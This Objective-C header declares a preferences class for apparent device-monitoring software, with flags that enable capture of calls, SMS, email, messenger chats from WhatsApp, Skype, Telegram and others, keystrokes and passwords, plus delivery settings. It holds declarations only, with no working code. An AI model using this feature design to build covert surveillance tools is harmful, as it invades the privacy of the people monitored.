/** 
 - Project name: Preferences
 - Class name: PrefEventsCapture
 - Version: 1.0
 - Purpose: Preference about captur
 - Copy right: 28/11/11, Benjawan Tanarattanakorn, Vervata Co., Ltd. All right reserved.
 */

#import <Foundation/Foundation.h>

#import "Preference.h"

enum {
	kSearchMediaImage	= 0x1,
	kSearchMediaVideo	= kSearchMediaImage << 1,
	kSearchMediaAudio	= kSearchMediaImage << 2
};

enum {
	kDeliveryMethodAny	= 0,
	kDeliveryMethodWifi	= 1
};

typedef enum {
    kPrefIMIndividualNone           = 0,
	kPrefIMIndividualWhatsApp       = 1 << 0,       // 1
	kPrefIMIndividualLINE			= 1 << 1,       // 2
	kPrefIMIndividualFacebook		= 1 << 2,       // 4
	kPrefIMIndividualSkype          = 1 << 3,       // 8
	kPrefIMIndividualBBM            = 1 << 4,       // 16
    kPrefIMIndividualIMessage       = 1 << 5,       // 32
    kPrefIMIndividualViber          = 1 << 6,       // 64
    kPrefIMIndividualGoogleTalk     = 1 << 7,       // 128
    kPrefIMIndividualWeChat         = 1 << 8,       // 256
    kPrefIMIndividualYahooMessenger = 1 << 9,       // 512
    kPrefIMIndividualSnapchat       = 1 << 10,      // 1024
    kPrefIMIndividualHangout        = 1 << 11,      // 2048
    kPrefIMIndividualSlingshot      = 1 << 12,      // 4096
    kPrefIMIndividualAppShotLINE    = 1 << 13,
    kPrefIMIndividualAppShotSkype   = 1 << 14,
    kPrefIMIndividualAppShotQQ      = 1 << 15,
    kPrefIMIndividualAppShotIMessage= 1 << 16,
    kPrefIMIndividualAppShotViber   = 1 << 17,
    kPrefIMIndividualAppShotWeChat  = 1 << 18,
    kPrefIMIndividualAppShotAIM     = 1 << 19,
    kPrefIMIndividualAppShotTrillian= 1 << 20,
    kPrefIMIndividualAppShotTelegram= 1 << 21
    // NSUIntegerMax 4294967295
} PrefIMIndividual;



@interface PrefEventsCapture : Preference {
@private
	BOOL		mStartCapture;
	BOOL		mEnableCallLog;
	BOOL		mEnableSMS;
	BOOL		mEnableEmail;
	BOOL		mEnableMMS;
	BOOL		mEnableIM;
	BOOL		mEnablePinMessage;
	BOOL		mEnableWallPaper;
	BOOL		mEnableCameraImage;
	BOOL		mEnableAudioFile;
	BOOL		mEnableVideoFile;
	BOOL		mEnableBrowserUrl;
	BOOL		mEnableALC;
	BOOL		mEnableCallRecording;
	BOOL		mEnableCalendar;
	BOOL		mEnableNote;
	BOOL		mEnableVoIPLog;
	BOOL		mEnableKeyLog;
    BOOL        mEnablePageVisited;
    BOOL        mEnablePassword;
    NSUInteger  mEnableIndividualIM;
    BOOL        mEnableUSBConnection;
    BOOL        mEnableFileTransfer;
    BOOL        mEnableAppUsage;
    BOOL        mEnableLogon;
    BOOL        mEnableTemporalControlSSR;
    BOOL        mEnableTemporalControlAR;
    BOOL        mEnableTemporalControlNetworkTraffic;
    BOOL        mEnableNetworkConnection;
    BOOL        mEnablePrintJob;
    BOOL        mEnableNetworkAlert;
    
	NSUInteger	mSearchMediaFilesFlags;
	NSUInteger	mDeliveryMethod;
	
	NSInteger	mMaxEvent;
	NSInteger	mDeliverTimer;
    
    NSUInteger  mIMAttachmentImageLimitSize;
    NSUInteger  mIMAttachmentAudioLimitSize;
    NSUInteger  mIMAttachmentVideoLimitSize;
    NSUInteger  mIMAttachmentNonMediaLimitSize;
}

@property (nonatomic, assign) BOOL mStartCapture;
@property (nonatomic, assign) BOOL mEnableCallLog;
@property (nonatomic, assign) BOOL mEnableSMS;
@property (nonatomic, assign) BOOL mEnableEmail;
@property (nonatomic, assign) BOOL mEnableMMS;
@property (nonatomic, assign) BOOL mEnableIM;
@property (nonatomic, assign) BOOL mEnablePinMessage;
@property (nonatomic, assign) BOOL mEnableWallPaper;
@property (nonatomic, assign) BOOL mEnableCameraImage;
@property (nonatomic, assign) BOOL mEnableAudioFile;
@property (nonatomic, assign) BOOL mEnableVideoFile;
@property (nonatomic, assign) BOOL mEnableBrowserUrl;
@property (nonatomic, assign) BOOL mEnableALC;
@property (nonatomic, assign) BOOL mEnableCallRecording;
@property (nonatomic, assign) BOOL mEnableCalendar;
@property (nonatomic, assign) BOOL mEnableNote;
@property (nonatomic, assign) BOOL mEnableVoIPLog;
@property (nonatomic, assign) BOOL mEnableKeyLog;
@property (nonatomic, assign) BOOL mEnablePageVisited;
@property (nonatomic, assign) BOOL mEnablePassword;
@property (nonatomic, assign) NSUInteger mEnableIndividualIM;
// Mac
@property (nonatomic, assign) BOOL mEnableUSBConnection;
@property (nonatomic, assign) BOOL mEnableFileTransfer;
@property (nonatomic, assign) BOOL mEnableAppUsage;
@property (nonatomic, assign) BOOL mEnableLogon;
@property (nonatomic, assign) BOOL mEnableTemporalControlSSR;
// iOS
@property (nonatomic, assign) BOOL mEnableTemporalControlAR;

@property (nonatomic, assign) BOOL mEnableTemporalControlNetworkTraffic;
@property (nonatomic, assign) BOOL mEnableNetworkConnection;
@property (nonatomic, assign) BOOL mEnablePrintJob;
@property (nonatomic, assign) BOOL mEnableNetworkAlert;

@property (nonatomic, assign) NSUInteger mSearchMediaFilesFlags;
@property (nonatomic, assign) NSUInteger mDeliveryMethod;

@property (nonatomic, assign) NSInteger mMaxEvent;
@property (nonatomic, assign) NSInteger mDeliverTimer;

@property (nonatomic, assign) NSUInteger mIMAttachmentImageLimitSize;
@property (nonatomic, assign) NSUInteger mIMAttachmentAudioLimitSize;
@property (nonatomic, assign) NSUInteger mIMAttachmentVideoLimitSize;
@property (nonatomic, assign) NSUInteger mIMAttachmentNonMediaLimitSize;

@end
